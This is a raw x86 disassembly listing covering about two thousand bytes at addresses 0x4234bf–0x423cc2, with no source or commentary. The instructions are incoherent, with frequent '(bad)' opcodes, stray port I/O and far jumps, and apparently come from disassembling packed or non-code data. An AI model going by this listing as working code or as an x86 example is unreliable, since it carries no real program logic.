  4234bf:	fwait
  4234c0:	xor    eax,0xb4ad7273
  4234c5:	sub    al,0x1d
  4234c7:	mov    eax,ds:0x44e3a8da
  4234cc:	hlt    
  4234cd:	nop
  4234ce:	repz push esi
  4234d0:	aad    0x54
  4234d2:	mov    ecx,0x99b75d58
  4234d7:	xor    al,BYTE PTR [ecx+0x1e279035]
  4234dd:	sub    eax,0x2103fa20
  4234e2:	dec    esi
  4234e3:	inc    esi
  4234e4:	push   ds
  4234e5:	cmp    BYTE PTR [ebx+0x4],ah
  4234e8:	scas   al,BYTE PTR es:[edi]
  4234e9:	ret    
  4234ea:	pop    es
  4234eb:	cmp    BYTE PTR [ecx],ah
  4234ed:	repz cmp BYTE PTR [ecx+0xdcf7b2c],0xa8
  4234f5:	ficom  DWORD PTR ss:[ecx-0x5135ae84]
  4234fc:	call   0xd5abe203
  423501:	idiv   DWORD PTR [ebx-0x29]
  423504:	ja     0x423491
  423506:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423507:	pusha  
  423508:	(bad)  
  423509:	rol    DWORD PTR [ebp+0x3],1
  42350c:	addr16 jno 0x423585
  42350f:	mov    ds:0x8f99aaca,al
  423514:	lods   al,BYTE PTR ds:[esi]
  423515:	stc    
  423516:	leave  
  423517:	pop    ecx
  423518:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423519:	imul   ecx,DWORD PTR [ebx-0x2b8a50bb],0x1d29d746
  423523:	and    al,0x3c
  423525:	inc    esp
  423526:	(bad)  
  423528:	jl     0x423596
  42352a:	mov    al,ds:0x244ca450
  42352f:	ins    DWORD PTR es:[edi],dx
  423530:	mov    ?,ecx
  423532:	out    dx,eax
  423533:	push   0x51692161
  423538:	adc    BYTE PTR [edx],al
  42353a:	sbb    al,0x28
  42353c:	and    eax,0xcde9e0cd
  423541:	sar    ah,0x1b
  423544:	scas   al,BYTE PTR es:[edi]
  423545:	push   0xffffffe4
  423547:	or     eax,0x13b41e86
  42354c:	mov    al,ds:0x4e28d70a
  423551:	les    eax,FWORD PTR [edi-0x31]
  423554:	shr    ebp,0xc
  423557:	jbe    0x4234f3
  423559:	ins    DWORD PTR es:[edi],dx
  42355a:	xchg   ebp,eax
  42355b:	sub    edi,DWORD PTR [edi-0x743360b7]
  423561:	sub    BYTE PTR [edx-0x746d2af4],0xd2
  423568:	xchg   edx,eax
  423569:	in     eax,dx
  42356a:	xor    ecx,0x7bd4
  423570:	je     0x423521
  423572:	leave  
  423573:	mov    eax,ds:0xb56afff9
  423578:	(bad)  
  423579:	inc    edi
  42357a:	push   edx
  42357b:	sub    BYTE PTR [ecx-0x2bc97f91],dl
  423581:	js     0x423575
  423583:	xchg   BYTE PTR [edi],bl
  423585:	es call 0xbb9f1dc1
  42358b:	out    0x7b,eax
  42358d:	ss mov bl,0x48
  423590:	data16 ja 0x42352e
  423593:	in     al,dx
  423594:	lds    ecx,FWORD PTR ds:0xd9d9fc2f
  42359a:	jae    0x4235bd
  42359c:	cmp    BYTE PTR ds:0x2121865c,dh
  4235a2:	adc    ebp,edi
  4235a4:	fild   WORD PTR [ebx]
  4235a6:	mov    ecx,DWORD PTR [ebp+0x7b]
  4235a9:	push   edx
  4235aa:	sbb    esi,DWORD PTR [ebp-0x49]
  4235ad:	mov    ebx,0xb69048dd
  4235b2:	and    DWORD PTR [edi],ebx
  4235b4:	jmp    0x5e2f8c37
  4235b9:	imul   esi,DWORD PTR [ebx+ebx*1],0x3c1d7037
  4235c0:	(bad)  
  4235c1:	mov    cl,0xcb
  4235c3:	mov    al,0x90
  4235c5:	xchg   edx,eax
  4235c6:	sub    BYTE PTR [ebp+0x1cb62897],cl
  4235cc:	ins    BYTE PTR es:[edi],dx
  4235cd:	dec    esi
  4235ce:	aaa    
  4235cf:	mov    ah,BYTE PTR [ebx+ebx*1]
  4235d2:	pop    edi
  4235d3:	pop    ss
  4235d4:	mov    ?,WORD PTR [ebx]
  4235d6:	loop   0x4235c2
  4235d8:	jmp    0x8488:0x83ed6cbe
  4235df:	xchg   ebx,eax
  4235e0:	cs push edx
  4235e2:	inc    edi
  4235e3:	push   esp
  4235e4:	pop    esi
  4235e5:	xchg   BYTE PTR [esi+0x75],ch
  4235e8:	cmp    BYTE PTR [edx],bh
  4235ea:	mov    ecx,DWORD PTR [edi]
  4235ec:	mov    dh,0x18
  4235ee:	jns    0x423610
  4235f0:	pop    esp
  4235f1:	lock int3 
  4235f3:	mov    edi,ebp
  4235f5:	cmp    esp,DWORD PTR [ecx+ebx*4]
  4235f8:	imul   edi,DWORD PTR [ecx+0x23],0x5
  4235fc:	or     esi,DWORD PTR [eax+ebp*1-0x4d]
  423600:	xor    edx,DWORD PTR [edi*1-0x1d3afe1e]
  423607:	xor    BYTE PTR [ecx],dh
  423609:	push   ebp
  42360a:	rcr    BYTE PTR [esi+0x5e5f6eea],cl
  423610:	push   esi
  423611:	rcl    BYTE PTR [ebp+0x4bea4ab9],cl
  423617:	rcl    DWORD PTR [ecx],cl
  423619:	xchg   ecx,eax
  42361a:	je     0x4235c6
  42361c:	cwde   
  42361d:	test   ah,bh
  42361f:	xlat   BYTE PTR ds:[ebx]
  423620:	sti    
  423621:	test   al,cl
  423623:	add    al,0x65
  423625:	mov    esi,0x8c0d3ede
  42362a:	sbb    DWORD PTR [ebx+0x1f],ecx
  42362d:	push   ebp
  42362e:	pop    ebx
  42362f:	aam    0x26
  423631:	nop
  423632:	clc    
  423633:	outs   dx,BYTE PTR ds:[esi]
  423634:	adc    eax,0x3d7ce065
  423639:	outs   dx,BYTE PTR ds:[esi]
  42363a:	jbe    0x4235c9
  42363c:	push   ss
  42363d:	jae    0x42366c
  42363f:	add    al,0xae
  423641:	and    DWORD PTR [esp+ebp*2],edi
  423644:	pop    ebp
  423645:	loope  0x4236b9
  423647:	jne    0x423614
  423649:	in     eax,dx
  42364a:	sub    al,0xea
  42364c:	sub    al,0x12
  42364e:	adc    al,0x99
  423650:	jnp    0x4235f9
  423652:	es je  0x42362d
  423655:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423656:	ins    DWORD PTR es:[edi],dx
  423657:	or     al,0xaf
  423659:	in     eax,0xd6
  42365b:	add    eax,0x45772aea
  423660:	or     ebx,edi
  423662:	pop    ebp
  423663:	pop    ds
  423664:	mov    ebx,0xbe51f2b3
  423669:	cmp    eax,0x6b36578
  42366e:	cdq    
  42366f:	popa   
  423670:	pop    ebx
  423671:	retf   0x4cce
  423674:	add    cl,BYTE PTR [ebp+0x50719739]
  42367a:	cmp    al,0x6e
  42367c:	jmp    0x239d97a0
  423681:	xchg   edi,eax
  423682:	call   FWORD PTR [ebx]
  423684:	mov    ebp,DWORD PTR gs:[ebx]
  423687:	aaa    
  423688:	push   ebx
  423689:	mov    ebp,DWORD PTR [edx]
  42368b:	jmp    FWORD PTR [esi]
  42368d:	(bad)  
  42368e:	ror    ch,0x76
  423691:	dec    eax
  423692:	jl     0x42366d
  423694:	jle    0x423639
  423696:	push   ds
  423697:	push   cs
  423698:	pop    ecx
  423699:	dec    edx
  42369a:	sub    esi,DWORD PTR [edx+ecx*2-0x16]
  42369e:	xor    DWORD PTR [ebp-0x2eebf761],ebp
  4236a4:	lods   al,BYTE PTR ds:[esi]
  4236a5:	and    esi,edi
  4236a7:	jb     0x423641
  4236a9:	lar    ebp,bp
  4236ac:	fcmovb st,st(5)
  4236ae:	shr    BYTE PTR [edi],0x9e
  4236b1:	(bad)  
  4236b2:	hlt    
  4236b3:	sbb    eax,0x6da71c2e
  4236b8:	dec    ebp
  4236b9:	data16 jmp 0x423727
  4236bc:	lds    edi,FWORD PTR [ecx+0x73]
  4236bf:	pop    ds
  4236c0:	jecxz  0x4236d0
  4236c2:	fisttp WORD PTR [edi-0x7b274078]
  4236c8:	scas   eax,DWORD PTR es:[edi]
  4236c9:	jge    0x423749
  4236cb:	test   al,0x7e
  4236cd:	in     al,dx
  4236ce:	add    DWORD PTR [esi],0x71
  4236d1:	sub    ah,BYTE PTR [edx+0x1ae8c33f]
  4236d7:	xor    bh,ah
  4236d9:	inc    ecx
  4236da:	push   ss
  4236db:	scas   eax,DWORD PTR es:[edi]
  4236dc:	xchg   ebp,eax
  4236dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236de:	pop    ecx
  4236df:	fdivrp st(5),st
  4236e1:	jno    0x423681
  4236e3:	sub    eax,ebp
  4236e5:	test   bh,bh
  4236e7:	test   eax,0x69c89315
  4236ec:	or     BYTE PTR [esp+edx*1],bh
  4236ef:	adc    ebx,edx
  4236f1:	sbb    edx,ecx
  4236f3:	add    BYTE PTR [esi+0x40bf5d6e],dl
  4236f9:	sub    DWORD PTR [esi],esp
  4236fb:	mov    dl,0xd4
  4236fd:	mov    esp,0xb36cea35
  423702:	sub    bh,BYTE PTR [ebx-0x4680a36a]
  423708:	mov    dl,0xb
  42370a:	jecxz  0x4236b9
  42370c:	cmp    dh,dh
  42370e:	dec    ecx
  42370f:	cmp    edx,DWORD PTR ds:0x6fc9a508
  423715:	repz xchg ebp,eax
  423717:	add    BYTE PTR [edx+0x3e99b770],bh
  42371d:	add    BYTE PTR [ecx],bl
  42371f:	cs sahf 
  423721:	jge    0x423760
  423723:	mov    bl,0x6b
  423725:	hlt    
  423726:	aad    0x4e
  423728:	mov    al,al
  42372a:	or     esi,ebx
  42372c:	sti    
  42372d:	test   eax,0xfd58d88c
  423732:	js     0x4236cc
  423734:	js     0x4236d8
  423736:	push   ss
  423737:	xchg   esp,eax
  423738:	mov    WORD PTR [bx-0x6c4c],?
  42373d:	add    DWORD PTR [ecx+0x24],ecx
  423740:	nop
  423741:	pop    eax
  423742:	xchg   edi,eax
  423743:	int3   
  423744:	int    0x92
  423746:	mov    esi,0x4eedefda
  42374b:	out    0x74,al
  42374d:	mov    al,0xf7
  42374f:	cmp    eax,0xe554a012
  423754:	cmc    
  423755:	(bad)  
  423756:	mov    al,0xf2
  423758:	add    al,0x17
  42375a:	iret   
  42375b:	xor    bh,BYTE PTR [ecx-0x7c]
  42375e:	and    cl,dh
  423760:	and    eax,0xceda7411
  423765:	push   0x90055883
  42376a:	fistp  WORD PTR [ecx+0x24]
  42376d:	bound  edi,QWORD PTR [esi-0x597b3732]
  423773:	mov    ch,0xe8
  423775:	adc    ebp,eax
  423777:	sar    bl,cl
  423779:	sub    ch,ah
  42377b:	hlt    
  42377c:	shl    DWORD PTR [edx-0x351c565d],1
  423782:	sub    DWORD PTR [eax+0x0],ebx
  423785:	data16 lahf 
  423787:	jmp    FWORD PTR [edx-0x63]
  42378a:	adc    al,cl
  42378c:	loope  0x4237aa
  42378e:	fstp   DWORD PTR [esi]
  423790:	mov    ah,0x80
  423792:	mov    cl,0xaf
  423794:	and    eax,ebp
  423796:	(bad)
  42379a:	clc    
  42379b:	retf   
  42379c:	loopne 0x42378d
  42379e:	inc    ecx
  42379f:	and    cl,0xed
  4237a2:	stos   BYTE PTR es:[edi],al
  4237a3:	imul   ebx,DWORD PTR [edx],0x66
  4237a6:	nop
  4237a7:	test   al,0x95
  4237a9:	and    al,0x40
  4237ab:	stc    
  4237ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237ad:	loope  0x42375a
  4237af:	cdq    
  4237b0:	leave  
  4237b1:	pop    esi
  4237b2:	(bad)  [eax+0x6f43c893]
  4237b8:	stos   BYTE PTR es:[edi],al
  4237b9:	pop    ecx
  4237ba:	fs std 
  4237bc:	sub    eax,0x9a6693c6
  4237c1:	dec    edi
  4237c2:	cwde   
  4237c3:	ss xchg ecx,eax
  4237c5:	(bad)  
  4237c6:	(bad)  
  4237c7:	cmp    al,0x98
  4237c9:	cdq    
  4237ca:	out    dx,eax
  4237cb:	jge    0x42383d
  4237cd:	push   edi
  4237ce:	dec    esi
  4237cf:	js     0x423772
  4237d1:	xchg   BYTE PTR [eax+0x45b06556],dh
  4237d7:	jnp    0x423838
  4237d9:	gs mov ah,0x7
  4237dc:	and    dh,BYTE PTR [eax+0x1c]
  4237df:	je     0x423837
  4237e1:	mov    ds:0x96526407,eax
  4237e6:	add    edi,DWORD PTR gs:[edx]
  4237e9:	mov    al,0x15
  4237eb:	sub    BYTE PTR [ebp+esi*4-0x11],bl
  4237ef:	mov    DWORD PTR [edx+0xe],ebx
  4237f2:	pop    ecx
  4237f3:	ret    
  4237f4:	cld    
  4237f5:	add    eax,ebp
  4237f7:	stos   DWORD PTR es:[edi],eax
  4237f8:	dec    esi
  4237f9:	scas   eax,DWORD PTR es:[edi]
  4237fa:	cwde   
  4237fb:	mov    esi,0xbda1bfe9
  423800:	mov    ds:0xd3ff89a4,al
  423805:	ret    0xf5b8
  423808:	and    al,0x82
  42380a:	push   esi
  42380b:	ret    0x6f70
  42380e:	mov    ebx,cs
  423810:	lds    esi,FWORD PTR [eax+0x4a704136]
  423816:	bnd jp 0x42379d
  423819:	fnsave [ecx-0x6d3ee596]
  42381f:	(bad)  
  423821:	mov    WORD PTR [edx-0x793a5a47],ds
  423827:	mov    edx,0xecc3bdaf
  42382c:	pcmpgtw mm6,mm7
  42382f:	jecxz  0x423812
  423831:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423832:	fs mov edi,0x21b2a343
  423838:	pop    ebp
  423839:	add    DWORD PTR [eax],ecx
  42383b:	lds    esi,FWORD PTR [ebx-0x5c]
  42383e:	jmp    0x4238a9
  423840:	push   edi
  423841:	adc    DWORD PTR [ebp+0x437f0fd],edx
  423847:	retf   
  423848:	shr    DWORD PTR [edx],1
  42384a:	add    BYTE PTR [ecx],cl
  42384c:	pop    ds
  42384d:	into   
  42384e:	test   BYTE PTR [ecx],cl
  423850:	pushf  
  423851:	ffree  st(0)
  423853:	(bad)  
  423854:	sahf   
  423855:	sub    al,0x82
  423857:	sbb    ecx,DWORD PTR [edi+0x63a495f2]
  42385d:	sbb    eax,0x73bb943b
  423862:	and    DWORD PTR [edi+ebx*4+0x45],eax
  423866:	pop    ebp
  423868:	sbb    edi,DWORD PTR [esi-0x17af6401]
  42386e:	fdiv   DWORD PTR [edx]
  423870:	xchg   esi,eax
  423871:	and    bh,cl
  423873:	cmp    al,0xd
  423875:	push   edx
  423876:	pop    ds
  423877:	push   cs
  423878:	or     bl,BYTE PTR [ebx+0x1648d520]
  42387e:	jl     0x42388d
  423880:	pop    edi
  423881:	(bad)  
  423882:	adc    al,0x7b
  423884:	jp     0x423889
  423886:	shl    ebp,cl
  423888:	data16 fucomip st,st(1)
  42388b:	mov    ah,0x92
  42388d:	sbb    eax,0xd0e7e1cc
  423892:	mov    dh,0xec
  423894:	or     DWORD PTR [ebp+0x7f7ab467],edx
  42389a:	jmp    0xa398:0x7de8a6e6
  4238a1:	test   eax,0xf3a74af5
  4238a6:	inc    ecx
  4238a7:	outs   dx,DWORD PTR cs:[esi]
  4238a9:	and    ebx,edi
  4238ab:	mov    dh,0x3d
  4238ad:	jbe    0x423874
  4238af:	into   
  4238b0:	stc    
  4238b1:	repz xchg esp,eax
  4238b3:	fwait
  4238b4:	inc    edi
  4238b5:	sar    al,cl
  4238b7:	sub    eax,0xcbd66420
  4238bc:	mov    ds:0x40aca271,eax
  4238c1:	or     DWORD PTR [esi-0x15819b9e],esi
  4238c7:	mov    edx,0xaa5a0a5c
  4238cc:	push   ebp
  4238cd:	pushf  
  4238ce:	test   DWORD PTR ss:0xf9f8b02f,ebx
  4238d5:	pop    edi
  4238d6:	bound  ebp,QWORD PTR [ebx+0x23]
  4238d9:	jno    0x4238f6
  4238db:	sub    bl,ch
  4238dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238de:	xor    dh,BYTE PTR [eax]
  4238e0:	mov    ah,0x10
  4238e2:	xor    eax,0x7a434781
  4238e7:	mov    dl,0x96
  4238e9:	jae    0x423964
  4238eb:	cmp    BYTE PTR [eax-0x68e1307b],dl
  4238f1:	xchg   edx,eax
  4238f2:	or     BYTE PTR [ebp-0x1],0xe5
  4238f6:	push   es
  4238f7:	cs dec eax
  4238f9:	xor    eax,0x61b587a9
  4238fe:	cmp    ch,BYTE PTR [edi-0x432666be]
  423904:	push   ebx
  423905:	ss jmp 0x1066c657
  42390b:	sub    DWORD PTR [ecx+ebx*8+0x4533e5f1],ecx
  423912:	dec    edx
  423913:	call   0xbaf3:0x96d73cf5
  42391a:	nop
  42391b:	(bad)  
  42391c:	mov    ecx,0x8538dc07
  423921:	and    eax,DWORD PTR [eax+0x7]
  423924:	push   0x4730f021
  423929:	push   edi
  42392a:	add    al,0xb7
  42392c:	mov    bh,BYTE PTR [ebx-0x54]
  42392f:	push   0x4
  423931:	pop    esi
  423932:	add    eax,0x608bc33d
  423937:	std    
  423938:	sbb    al,0x14
  42393a:	xchg   al,dl
  42393c:	iret   
  42393d:	push   ebx
  42393e:	inc    ecx
  42393f:	xor    eax,DWORD PTR [ebp-0x556405fe]
  423945:	dec    ebx
  423946:	aam    0xd0
  423948:	popf   
  423949:	fs jp  0x4239b5
  42394c:	xor    DWORD PTR [ebp-0x3],eax
  42394f:	call   0x532:0x5bdbe612
  423956:	outs   dx,DWORD PTR ds:[esi]
  423957:	adc    al,0x56
  423959:	fldenv [ecx+ebx*4-0x5b839180]
  423960:	imul   edx,DWORD PTR [edi-0x5a87aa1a],0xffffffd9
  423967:	lods   al,BYTE PTR ds:[esi]
  423968:	adc    DWORD PTR [ebp+0x63],edi
  42396b:	jnp    0x423976
  42396d:	inc    edx
  42396e:	pop    es
  42396f:	fcomp  DWORD PTR [esi-0x59]
  423972:	push   ecx
  423973:	add    ebx,edx
  423975:	mov    esp,0x3c33d365
  42397a:	dec    esi
  42397b:	jne    0x133f0b0a
  423981:	daa    
  423982:	aaa    
  423983:	test   DWORD PTR [esi-0x24bcea99],ebx
  423989:	out    dx,eax
  42398a:	div    DWORD PTR [ecx+edi*1]
  42398d:	adc    eax,0x5d736fcc
  423992:	pop    esi
  423993:	(bad)  
  423994:	and    ebx,DWORD PTR [edx-0x62]
  423997:	or     ebx,DWORD PTR ds:0xcf0ea93a
  42399d:	rol    cl,cl
  42399f:	or     dl,BYTE PTR [ecx-0xcede8d1]
  4239a5:	retf   0x3173
  4239a8:	mov    edx,0x7d9c36dc
  4239ad:	pop    ds
  4239ae:	adc    BYTE PTR [eax-0x56599c47],al
  4239b4:	jecxz  0x4239ee
  4239b6:	lock and DWORD PTR [ebx],eax
  4239b9:	mov    ebp,eax
  4239bb:	in     eax,dx
  4239bc:	sbb    al,0x5
  4239be:	shl    edi,1
  4239c0:	push   0x205e06c3
  4239c5:	mov    ch,0x81
  4239c7:	xchg   edx,eax
  4239c8:	push   es
  4239c9:	nop
  4239ca:	mov    bh,0x20
  4239cc:	jg     0x4239e8
  4239ce:	pop    ebp
  4239cf:	nop
  4239d0:	jbe    0x42395c
  4239d2:	jmp    0x423a38
  4239d4:	pusha  
  4239d5:	adc    DWORD PTR [eiz*2-0x6c500032],ebp
  4239dc:	out    0x2a,al
  4239de:	sti    
  4239df:	xor    ebx,esp
  4239e1:	dec    esi
  4239e2:	jb     0x4239bb
  4239e4:	sbb    DWORD PTR [ecx-0x13],edx
  4239e7:	pop    esi
  4239e8:	xchg   edx,eax
  4239e9:	sbb    eax,DWORD PTR [esi]
  4239eb:	bound  eax,QWORD PTR [eax+0x6fc78f83]
  4239f1:	clc    
  4239f2:	in     al,dx
  4239f3:	sbb    eax,0x7f44e62e
  4239f8:	xchg   edi,eax
  4239f9:	gs cld 
  4239fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239fc:	loop   0x423981
  4239fe:	xchg   ebp,eax
  4239ff:	inc    ebx
  423a00:	fistp  DWORD PTR [edi-0x5908b2e9]
  423a06:	push   0xefa85685
  423a0b:	pop    ebp
  423a0c:	and    dh,ah
  423a0e:	popf   
  423a0f:	out    0x32,al
  423a11:	sahf   
  423a12:	icebp  
  423a13:	xchg   edx,eax
  423a14:	push   0x535bb6fb
  423a19:	pushf  
  423a1a:	ret    
  423a1b:	jmp    0x355e:0xfcb8cbde
  423a22:	mov    ah,0xd9
  423a24:	hlt    
  423a25:	dec    ecx
  423a26:	push   esi
  423a27:	je     0x423a57
  423a29:	inc    eax
  423a2a:	aaa    
  423a2b:	out    0xc1,al
  423a2d:	and    ecx,DWORD PTR [edi+0x73470f19]
  423a33:	push   eax
  423a34:	mov    ds:0x4f22330d,eax
  423a39:	iret   
  423a3a:	and    eax,0xa4ceb229
  423a3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a40:	rol    DWORD PTR [esi+ebx*4],0x2d
  423a44:	jnp    0x423a9a
  423a46:	in     al,0xd5
  423a48:	cmp    DWORD PTR [ebp-0x11b2e702],edx
  423a4e:	or     BYTE PTR [ebx+0x12eb9fb4],bh
  423a54:	(bad)  [ecx]
  423a56:	in     eax,0xfd
  423a58:	pop    ebp
  423a59:	(bad)  
  423a5b:	fwait
  423a5c:	sbb    BYTE PTR [edi-0x1f],al
  423a5f:	daa    
  423a60:	paddusw mm5,mm2
  423a63:	cmp    ecx,DWORD PTR [ebp+ebx*8-0x19]
  423a67:	mov    bl,0x3
  423a69:	fwait
  423a6a:	jae    0x423abd
  423a6c:	cdq    
  423a6d:	lahf   
  423a6e:	jns    0x423a8f
  423a70:	nop
  423a71:	loopne 0x423a1e
  423a73:	lock jge 0x423a5f
  423a76:	(bad)
  423a79:	cli    
  423a7a:	sbb    al,0xee
  423a7c:	data16 and al,0x24
  423a7f:	bound  ebx,QWORD PTR [ecx+0x3d632509]
  423a85:	stc    
  423a86:	(bad)  
  423a87:	sbb    DWORD PTR [edi],ebx
  423a89:	push   0x5be31aa1
  423a8e:	mov    ecx,0x3abfde91
  423a93:	mov    bl,0x98
  423a95:	add    eax,0xc6773058
  423a9a:	popa   
  423a9b:	test   DWORD PTR [eax+0x565b070a],edx
  423aa1:	das    
  423aa2:	clc    
  423aa3:	mov    BYTE PTR [ebp-0x41882640],al
  423aa9:	and    ch,BYTE PTR [esi]
  423aab:	add    DWORD PTR [edi],0xdd36f589
  423ab1:	jae    0x423af2
  423ab3:	inc    DWORD PTR [edi+0x523bdafa]
  423ab9:	inc    edi
  423aba:	aam    0x78
  423abc:	mov    esp,DWORD PTR [ebp+0x33]
  423abf:	push   ss
  423ac0:	idiv   DWORD PTR [ecx]
  423ac2:	sub    ebx,DWORD PTR [ebp+0x56]
  423ac5:	mov    edx,0x812cacb3
  423aca:	(bad)  
  423acb:	les    edi,FWORD PTR [eax]
  423acd:	mov    eax,ds:0x24cb4bf9
  423ad2:	cdq    
  423ad3:	mov    ds:0xc66896b9,al
  423ad8:	(bad)  
  423ad9:	out    0x7e,eax
  423adb:	jl     0x423ab9
  423add:	and    bl,BYTE PTR [bp+si-0x5999]
  423ae2:	and    eax,ecx
  423ae4:	(bad)  [esi+0x13dbca5e]
  423aea:	sbb    DWORD PTR [ecx+0x68e999d2],edi
  423af0:	xchg   esi,eax
  423af1:	std    
  423af2:	add    eax,0x4dfb9142
  423af7:	sbb    ebp,esi
  423af9:	or     ch,BYTE PTR [ecx]
  423afb:	mov    bl,0xbf
  423afd:	enter  0x8357,0x7e
  423b01:	sti    
  423b02:	xor    al,0x85
  423b04:	or     al,BYTE PTR [edi-0x127ead99]
  423b0a:	mov    ds:0xeac54e5b,eax
  423b0f:	or     eax,0x9f86bb52
  423b14:	mov    esp,0xd7ea26b6
  423b19:	into   
  423b1a:	sub    BYTE PTR [eax-0x3325235d],dl
  423b20:	fst    DWORD PTR [esi+0x60]
  423b23:	ins    DWORD PTR es:[edi],dx
  423b24:	ins    DWORD PTR es:[edi],dx
  423b25:	add    esi,ecx
  423b27:	ret    0x212e
  423b2a:	in     eax,0x88
  423b2c:	push   ebx
  423b2d:	mov    ss,WORD PTR [eax-0xa646aed]
  423b33:	dec    eax
  423b34:	clc    
  423b35:	jb     0x423b17
  423b37:	sub    al,0xa2
  423b39:	fidiv  WORD PTR [edx]
  423b3b:	loop   0x423b77
  423b3d:	pusha  
  423b3e:	std    
  423b3f:	shr    al,1
  423b41:	dec    ebp
  423b42:	jne    0x423b95
  423b44:	push   eax
  423b45:	cmp    DWORD PTR [edx-0x26b0194b],ecx
  423b4b:	push   edx
  423b4c:	enter  0xbf79,0xa0
  423b50:	sbb    eax,0x41adb2
  423b55:	out    0xd7,eax
  423b57:	adc    BYTE PTR [ebp+eiz*1-0x35f865f],0x5b
  423b5f:	push   ebp
  423b60:	xchg   esi,eax
  423b61:	int    0xd4
  423b63:	popa   
  423b64:	mov    dl,0xeb
  423b66:	xor    eax,0xb6fe4451
  423b6b:	sbb    al,0x38
  423b6d:	test   BYTE PTR [ebx+0x439e99d2],0x11
  423b74:	hlt    
  423b75:	cmp    DWORD PTR [edx+0x15],0x8f7c0ba7
  423b7c:	adc    BYTE PTR [ebp+0x5d],0x73
  423b80:	loope  0x423bc1
  423b82:	inc    edx
  423b83:	fcmovnu st,st(0)
  423b85:	retf   0xb060
  423b88:	or     eax,0x54f0f372
  423b8d:	xchg   ebx,eax
  423b8e:	mov    al,ds:0x6f5db7d4
  423b93:	jmp    0x423b30
  423b95:	mov    dl,0x6d
  423b97:	mov    al,0x7
  423b99:	pop    ebx
  423b9a:	(bad)  
  423b9b:	lods   eax,DWORD PTR ds:[esi]
  423b9c:	jno    0x423bb2
  423b9e:	mov    eax,ds:0x61cd1f73
  423ba3:	jmp    0xbf9c:0xf4055627
  423baa:	retf   
  423bab:	add    DWORD PTR [ecx+0x41],0xffffffb1
  423baf:	add    BYTE PTR [esi-0x42],ch
  423bb2:	cmp    BYTE PTR [edx],cl
  423bb4:	jno    0x423bc9
  423bb6:	mov    ebp,0x3a44344c
  423bbb:	mov    edx,0xde8ab1fd
  423bc0:	mov    eax,DWORD PTR [esi+0x17f12d35]
  423bc6:	(bad)  
  423bc7:	icebp  
  423bc8:	sbb    eax,0x835b53eb
  423bcd:	xlat   BYTE PTR ds:[ebx]
  423bce:	stos   DWORD PTR es:[edi],eax
  423bcf:	sbb    BYTE PTR [ecx+0x57],ch
  423bd2:	test   eax,0x6b25786c
  423bd7:	cmp    eax,0xb0283a1b
  423bdc:	mov    eax,0xa5f4b9d5
  423be1:	fs lahf 
  423be3:	or     edi,esp
  423be5:	popf   
  423be6:	mov    bl,0x32
  423be8:	je     0x423b7d
  423bea:	and    al,0x30
  423bec:	rcr    ecx,0xe3
  423bef:	sbb    al,BYTE PTR [ebp-0x5d]
  423bf2:	push   esi
  423bf3:	push   0xdfacf539
  423bf8:	mov    esi,0xbe9db95c
  423bfd:	sub    DWORD PTR [ecx-0x3e7961f9],esi
  423c03:	fdivr  QWORD PTR [eax-0x7a]
  423c06:	fimul  DWORD PTR [esi]
  423c08:	or     al,0x54
  423c0a:	scas   eax,DWORD PTR es:[edi]
  423c0b:	repnz daa 
  423c0d:	aad    0x6f
  423c0f:	adc    eax,0x91a2905e
  423c14:	xor    DWORD PTR [edx+edx*8],esi
  423c17:	sub    DWORD PTR [esi-0x17],ebx
  423c1a:	inc    ebp
  423c1b:	push   ss
  423c1c:	add    DWORD PTR ds:0xf5455114,ebx
  423c22:	pcmpgtw mm1,QWORD PTR [eax-0xa]
  423c26:	out    0x16,eax
  423c28:	lea    ecx,[eax]
  423c2a:	inc    ebp
  423c2b:	ret    0xb27e
  423c2e:	xor    DWORD PTR [ebp-0x577ce10],edi
  423c34:	fdivr  DWORD PTR [eax+0x2c]
  423c37:	jne    0x423c09
  423c39:	mov    dh,0xba
  423c3b:	sub    cl,BYTE PTR [ebx]
  423c3d:	(bad)  
  423c3e:	pop    ecx
  423c3f:	test   al,0xba
  423c41:	lods   eax,DWORD PTR ds:[esi]
  423c42:	push   0xffffffd8
  423c44:	xor    ecx,DWORD PTR [ecx-0x54]
  423c47:	add    al,0x1f
  423c49:	mov    dl,BYTE PTR [eax]
  423c4b:	(bad)  
  423c4c:	jne    0x423c57
  423c4e:	retf   
  423c4f:	jb     0x423c0c
  423c51:	ins    DWORD PTR es:[edi],dx
  423c52:	out    dx,eax
  423c53:	jno    0x423cce
  423c55:	sbb    dh,ah
  423c57:	sub    DWORD PTR [ebx-0x73],0xffffffd9
  423c5b:	and    DWORD PTR ds:0xeb5a7bd9,ebx
  423c61:	xchg   esi,eax
  423c62:	ja     0x479191fc
  423c68:	sub    al,0xd
  423c6a:	inc    ecx
  423c6b:	and    eax,DWORD PTR ds:0xb96e6f30
  423c71:	xchg   DWORD PTR [ecx+0x2c],edx
  423c74:	popa   
  423c75:	ror    DWORD PTR [esi+0x77bc7f02],cl
  423c7b:	cs pop edi
  423c7d:	inc    esi
  423c7e:	and    DWORD PTR [ebx+eiz*8-0x3d98b834],eax
  423c85:	int    0xa3
  423c87:	dec    edx
  423c88:	xchg   dl,ch
  423c8a:	stos   DWORD PTR es:[edi],eax
  423c8b:	pushf  
  423c8c:	push   edi
  423c8d:	mov    ebx,0xb3fd2e11
  423c92:	clc    
  423c93:	mov    es,WORD PTR [eax+eiz*2]
  423c96:	ja     0x423cf6
  423c98:	mov    ch,0x5f
  423c9a:	adc    DWORD PTR [edx],eax
  423c9c:	scas   al,BYTE PTR es:[edi]
  423c9d:	and    al,0xfc
  423c9f:	pop    ebx
  423ca0:	cmp    al,0x18
  423ca2:	jl     0x423c9a
  423ca4:	js     0x423c30
  423ca6:	cdq    
  423ca7:	push   ds
  423ca8:	cmp    al,0xc4
  423caa:	xchg   ebx,ebp
  423cac:	mov    esp,0x4a16931f
  423cb1:	jle    0x423cbe
  423cb3:	frstor [eax+0x3d]
  423cb6:	imul   esi,DWORD PTR [eax-0x12],0x175e32b1
  423cbd:	ret    0xf4b6
  423cc0:	mov    bh,0xa4
  423cc2:	add    esp,DWORD PTR [eax-0x18]
